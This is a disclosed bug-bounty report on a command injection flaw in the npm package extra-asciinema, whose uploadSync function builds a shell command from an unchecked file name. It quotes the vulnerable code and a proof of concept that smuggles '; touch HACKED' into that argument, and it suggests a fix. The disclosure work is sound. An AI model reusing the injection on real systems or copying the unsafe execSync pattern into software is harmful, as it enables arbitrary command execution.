# [extra-asciinema] Command Injection via insecure command formatting

## Report Details
- **Report ID**: 863956
- **URL**: https://hackerone.com/reports/863956
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-01T11:39:52.991Z
- **Disclosed**: 2020-08-22T08:48:20.138Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Command Injection` issue in the `extra-asciinema` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `extra-asciinema`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extra-asciinema`

## Module Description

asciinema is a terminal screen recorder.

With this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.

## Module Stats

[23] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `uploadSync` function.
Here's the code which causes the issue:

```javascript
// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214
...
const cp9 = require('child_process');
...
/**
 * Upload recorded asciicast to asciinema.org site.
 * @param {string} f filename
 * @returns {string} asciicast URL
 */
function uploadSync(f) {
  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});
  return stdout.replace(/.*?(https?:\S+).*/s, '$1');
}
...
```
The `f` parameter is used to build the command that is passed to the `child_process.execSync` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `extra-asciinema` module:
    -  `npm i extra-asciinema`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const asciinema = require('extra-asciinema');
asciinema.uploadSync('; touch HACKED');

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810853}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFileSync`](https://nodejs.org/api/child_process.html#child_process_child_process_execfilesync_file_args_options) or [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options) functions instead of `child_process.execSync`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `extra-asciinema` module via insecure command formatting.

## Attachments
- poc_extra-asciinema.mov
